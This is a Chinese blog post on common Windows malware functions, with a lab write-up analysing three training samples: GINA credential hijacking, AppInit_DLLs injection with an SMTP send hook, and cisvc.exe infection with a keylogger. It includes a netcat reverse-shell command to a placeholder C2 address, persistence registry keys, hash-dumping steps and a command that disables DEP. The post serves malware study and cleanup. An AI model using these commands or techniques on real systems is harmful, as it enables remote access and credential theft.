---
title: Windows恶意代码常见功能
date: 2019-10-30 14:27:50
tags: windows病毒分析
---

# 知识引入

**下载器和启动器：**下载器通常和漏洞利用(exploit)结合在一起，常用API：URLDownloadtoFileA和WinExec。而启动器使用来启动恶意代码的程序

**后门backdoor：**提供给攻击者远程访问受害主机的通道，功能丰富。

* Netcat反向shell：在受害者机器上执行反向主动连接到C2服务器特定端口的命令"nc C2_ip  port -e cmd.exe"，"-e"指定连接建立后运行的成程序并且该程序的标准输入和输出都会被绑定在套接字上

* Windows反向shell：前面说过，使用CreateProcess来创建cmd.exe程序的进程，并将标准输入、输出、错误流都绑定到和远程C2服务器建立连接的套接字上。

  还有一种方法涉及一个套接字、两个管道、两个线程，用来加解密传输过程中的数据，后面文章详细解释

**远程控制工具RAT：**远程管理一台或者多台计算机，存在丰富交互行为

**僵尸网络：**被感染主机的集合。有单一控制服务器来控制，数量级别比较大，不存在复杂交互，并且同一时间被控制

**登陆凭证窃密器：**

* (XP)GINA拦截：微软图形识别与登陆验证界面，允许第三方添加一些代码来自定义登陆过程。Gina在msgina.dll中实现，这个DLL在用户登录过程中由Winlogon可执行文件加载，恶意代码可以修改注册表项"Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL"来在Winlogon加载msgina.dll之前加载恶意第三方DLL实现类似中间人的角色，由于要拦截对gina的请求，需要实现msgina.dll的导出接口，导出很多Wlx开头的15+函数

* 口令HASH转储：通过抓取登陆凭证HASH来进行暴力破解或者Pass-the-Hash工具（没有明文的情况下通过LM或者NTLM哈希来通过远程主机的验证来获取访问权限）。pwdump通过注入DLL到lsass.exe中来获取权限访问更多API来获取哈希。导入"samsrv.dll"和"advapi.dll"访问SAM和获取没被lsass.exe导入的函数。SamIConnect链接SAM，SamQueryInformationUser来提取hash，SystemFunction025和SystemFunction027用来解密哈希

* 键盘记录：有内核层(Rootkit)和用户层的记录器。用户层通常使用SetWindowsHookEx安装挂钩或者轮询使用GetAsyncKeyState(识别一个按键是否被按下)、GetForegroundWindow(识别但钱聚焦的前端窗口)检查按键状态

  **主机驻留：**

* 修改注册表：自启动注册表、svchost DLL

* 感染系统二进制文件。插入恶意代码到新建的空节中

* DLL顺序加载劫持：非KnowDLL保护的DLL程序加载要安装顺序加载从加载应用程序的目录到当前目录再到系统目录以及之后的目录这个次序开始寻找和加载。我们利用这种顺序加载，将恶意DLL放在前面的目录就行

**提权：**用户即使是管理员权限也没有任意访问系统一切资源的权限，例如在远程进程中调用TerminateProcess、CreateRemoteThread函数。所以我们需要提升权限，途径是：通过调用AdjustTokenPrivilege来调整进程的访问令牌来提升权限到SeDebugPrivilege，默认只能赋给管理员。

* 实现过程：OpenProcessToken来获取进程访问令牌，GetCurrentProcess获取进程句柄，将句柄以及期望获取的权限作为参数传给LookupPrivilegeValueA，获取本地唯一标识符LUID，标识特定权限。接着将访问令牌和LUID传给AdjustTokenPrivileges来调整权限

**用户态Rootkit：**在用户态通过Hook技术来隐藏恶意代码的进程和痕迹

* IAT Hook：修改导入地址表IAT或者导出地址表EAT
* Inline Hook：修改代码指令，覆盖被Hook函数开始的几个指令为跳转到恶意代码出的跳转指令

  # 目标

通过练习样本接触常见恶意代码类型。

通过Lab11-01的样本学习:

* XP系统上修改注册表拦截GINA来获取用户登录信息

通过Lab11-02的样本学习:

* AppInit_DLLs和LoadAppInit_DLLs引起的恶意DLL注入
* Inline-Hook实现的添加窃取邮件数据

# 流程

1. 基础静态分析
2. 高级静态动态结合分析

# 实践

## 实例1

### 基础静态分析

**Lab11-01.exe**

* 加载资源
* 修改注册表，可能用来劫持msgina.dll来获取登陆凭证

```
导入函数：
LoadResource
RegSetValueExA

资源节中存在PE文件

字符串：
msutil32.sys
Software\Microsoft\Windows NT\CurrentVersion\Winlogon
WlxInitialize
WlxRemoveStatusMessage
WlxShutdown
MSGina.dll
...
```

**资源PE(DLL)文件**

修改注册表，但这个已经是恶意的劫持模块了，所以暂时不能分析具体行为，我们结合高级分析技术来断定

  ```
导入函数：
RegSetValueExW

导出函数：
WlxInitialize
WlxLogoff
...

字符串：
Software\Microsoft\Windows NT\CurrentVersion\Winlogon
msutil32.sys
MSGina.dll
  ```

### 高级静态动态结合分析

#### Lab11-01.exe

将资源文件写入到"msgina32.dll"文件

![1572851806636](1572851806636.png)

传入参数"C:\Users\15pb-win7\Desktop\msgina32.dll"作为注册表项"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"的"GinaDll"键值项的值。下面if语句是一旦成功就执行else，失败返回1

![1572852500417](1572852500417.png)

![1572852878780](1572852878780.png)

#### 资源PE文件

加载DLL文件"c:\windows\system32\MSGina"，并获取相应句柄作为全局变量。在大部分导出函数中一旦调用相应API，该恶意DLL就会通过该句柄来调用原始文件MSGina来处理请求。

![1572853946362](1572853946362.png)

![1572854664793](1572854664793.png)

存在个别例外函数来执行恶意行为，例如：WlxLoggedOutSAS，在注销用户时将用户登录凭证保存到msutil32.sys文件中

![1572855811938](1572855811938.png)

![1572855916756](1572855916756.png)

在DLL注册和注销的时候，修改注册表再将"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"的键值"GinaDLL"为系统原始的msgina.dll文件

![1572857822691](1572857822691.png)

### 小结

**Lab11-01.exe文件的主机行为：**

* 添加注册表键："HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDll"

Lab11-01.exe的资源文件主机行为：

* 将登陆信息存储到"msutil32.sys"文件中

**清理病毒：**

* 删除"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDll"注册表键值
* 删除"msutil32.sys"文件

## 实例2

Lab11-02.dll

Lab11-02.ini

### 静态分析

* 遍历线程
* 修改注册表"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"的键值"AppInit_DLLs"指定的DLL文件会让所有加载user32.dll的进程都会加载恶意代码

未能明显显示出

```
导入函数：
RegSetValueExA
Thread32Next
Thread32First

导出函数：
installer

字符串：
send
THEBAT.EXE
OUTLOOK.EXE
MSIMN.EXE
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
AppInit_DLLs
\Lab11-02.ini
spoolvxx32.dll
```

### 高级静态动态结合分析

首先分析DLL文件的DllMain函数

读取"C:\Windows\system32\Lab11-02.ini"文件到全局变量byte_100034A0

![1572920783493](1572920783493.png)

动态解密Lab11-02.ini文件的内容: billy@malwareanalysisbook.com

![1572921138468](1572921138468.png)

获取当前进程的文件路径并截取文件名。如果满足：文件名等于THEBAT.EXE，或者等于 OUTLOOK.EXE，或者等于MSIMN.EXE就可以继续执行，否则返回退出，也就是说下面函数中过的行为是针对这三个进程的，下面看针对这些进程会有什么操作

![1572921956610](1572921956610.png)

第一个函数：遍历线程，将所有非恶意DLL的线程都挂起

![](1573095043038.png)

第二个函数：Inline Hook send函数。

![1573100377662](1573100377662.png)

Hook send函数后解析数据包，拦截包含SMTP协议的数据包，将收件人改成 billy@malwareanalysisbook.com，然后跳转回被Hook的函数

![1573101708497](1573101708497.png)

第三个函数：遍历线程将所有非当前线程的线程都恢复

![1573101747544](1573101747544.png)

到这里我们DllMain函数分析完毕，主要行为就是:

* 解密C:\Windows\system32\Lab11-02.ini文件中的email地址
* hook send函数，拦截THEBAT.EXE、 OUTLOOK.EXE、MSIMN.EXE进程的SMTP协议的邮件数据包，将邮件收件人改成刚解密的C2地址

下面开始分析导出函数installer：修改注册表键值"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs"为"spoolvxx32.dll"，接着将恶意DLL复制为系统目录下的"spoolvxx32.dll"，实现所有导入user32.dll进程的恶意DLL注入

![1573102365675](1573102365675.png)

使用命令行调用"rundll32.exe Lab11-02.dll installer"运行DLL的导出函数，但是如果重启机器会发现DLL并没有被注入到所有加载user32.dll的进程中，还需要我们手动来讲注册表项**LoadAppInit_DLLs**置1，重启之后才可以成功DLL注入

![1573102562911](1573102562911.png)

在虚拟机中搭建好outlook2013客户端，配置好账户信息后，随便发送一条信息，用wireswhark抓包可以捕获到我们的邮件接收人多了一位billy@malwareanalysisbook.com，恶意DLL注入成功，这里需要拍我们在配置OUTLOOK客户端的时候将发送服务器(SMTP)端口设置为25才可以，而不是QQ邮件官方教程中的465端口

![1573181732472](1573181732472.png)

### 小结

该样本主要行为是通过修改AppInit_DLLs注册表键值来进行恶意DLL注入，再结合Inline-Hook send函数来拦截SMTP协议的邮件数据包，添加邮件接收人来进行信息窃取

**清除病毒：**

* 删除"C:\Windows\system32\Lab11-02.ini"

* 删除"spoolvxx32.dll"

* 清除注册表项键值AppInit_DLLs中的spoolvxx32.dll，重新启动

* 将注册表键值LoadAppInit_DLLs置0

## 实例3

Lab11-03.exe

Lab11-03.dll

### 基础静态分析

#### Lab11-03.exe

* 文件操作，对特定后缀".com、.exe、.bat、.cmd"文件的操作
* 启动服务cisvc
* 涉及"command.com"的网络行为

```
导入函数：
MapViewOfFile
CreateFileMappingA
CopyFileA

字符串：
cmd.exe
command.com
.com
.exe
.bat
.cmd
C:\WINDOWS\System32\inet_epar32.dll
net start cisvc
C:\WINDOWS\System32\%s
cisvc.exe
Lab11-03.dll
```

#### Lab11-03.dll

* 互斥体
* 伪装系统DLL的kernel64x.dll
* 键盘记录

```
导入函数：
OpenMutexA
GetForegroundWindow
GetAsyncKeyState

导出函数：
zzz69806582

字符串：
C:\WINDOWS\System32\kernel64x.dll
user32.dll
Lab1103dll.dll
<SHIFT> 
```

### 高级静态动态结合分析

先看Lab11-03.exe文件。主要分为3步：

1. 将同目录下的"Lab11-03.dll"复制到"C:\\WINDOWS\\System32\\inet_epar32.dll"
2. "C:\\WINDOWS\\System32\\cisvc.exe"字符串传入sub_401070
3. 开启服务cisvc

下面主要看sub_401070的行为

![1573185511695](1573185511695.png)

解析"C:\\WINDOWS\\System32\\cisvc.exe"文件并且修改.text段的数据，我们下面动态跟踪

![1573199440592](1573199440592.png)

由于是将409030处的数据写入.text段，所以判定是一段shellcode，反汇编后是对应的代码

![1573199648992](1573199648992.png)

但是硬读汇编也不太好理解，我们这里看能不能从shellcode里找到什么有用的字符串来帮助分析.

我们可以看到下面这两个字符串，可以判断这个shellcode的功能就是启用这个DLL文件的导出函数

![1573199962630](1573199962630.png)

这里我们可以动态跟踪这个被修改后的cisvc.exe文件，在shellcode里加载恶意DLL

![1573206940849](1573206940849.png)

调用导出函数，最后跳转回原始文件的入口位置

![1573207046460](1573207046460.png)

接着我们看Lab11-03.dll具体有哪些行为，导出函数 zzz69806582 创建线程

![1573203913117](1573203913117.png)

创建互斥量"MZ",，创建文件C:\WINDOWS\System32\kernel64x.dll

![1573206428734](1573206428734.png)

聚焦当前桌面上的窗口

![1573206224027](1573206224027.png)

遍历每个按键的状态，来记录键盘敲击内容

![1573206281883](1573206281883.png)

最后将内容写回C:\WINDOWS\System32\kernel64x.dll文件中

![1573206371627](1573206371627.png)

### 小结

该样本通过修改CISVC.exe文件感染text段，植入shellcode来启动DLL文件并调用导出函数，接着创建线程来键盘记录，由于Win7 32上没有这个服务所以该样本需要在XP上执行

**清除病毒**

* 删除"C:\\WINDOWS\\System32\\inet_epar32.dll"
* 删除CISVC.exe，重新下载干净的CISVC.exe
* 删除C:\WINDOWS\System32\kernel64x.dll

# 补充知识

**Inline-Hook：**将被Hook函数汇编代码首5字节数据修改成一个jmp指令，跳转到目标地址(jmp的偏移值=目标地址-被hook函数地址-5)，被覆盖的5字节指令需要申请一块可读可写可执行的内存块保存下来并且紧跟一个跳转回被Hook函数的跳转指令

**outlook2013联网崩溃：**一旦连上网络，outlook启动就会崩溃，解决方案很简单关闭DEP，`bcdedit /set nx alwaysoff`管理员权限命令行执行即可，然后重启机器即可生效

# 参考

【1】[HOOK API例子](http://blog.chinaunix.net/uid-20761940-id-668884.html)

【2】[appinit_dlls注册表方式注入dll](http://www.atomsec.org/逆向/appinit_dlls注册表方式注入dll/)